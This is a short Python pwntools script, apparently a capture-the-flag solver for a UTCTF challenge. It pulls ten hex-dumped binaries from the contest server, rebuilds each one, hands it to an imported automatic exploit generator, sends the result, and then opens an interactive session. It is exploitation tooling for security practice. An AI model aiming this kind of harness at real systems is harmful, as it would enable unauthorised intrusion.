#!/usr/bin/python3

from pwn import *
from subprocess import run, PIPE
from res import solve

# context.log_level = 'debug'

p = remote('pwn.utctf.live', 9997)

p.sendlineafter(b'binary.\n', b'')

for tr in range(10):
    log.info(f'Binary #{tr}')
    data = p.recvuntil(b'\n\n')

    fin = open('bin.xxd', 'wb')
    fin.write(data)
    fin.close()

    bin_content = run('xxd -r bin.xxd'.split(' '), stdout=PIPE).stdout
    fin = open('bin', 'wb')
    fin.write(bin_content)
    fin.close()

    exploit = solve('./bin')
    p.send(exploit)
    
    p.recvuntil(b'100\n')

p.interactive()
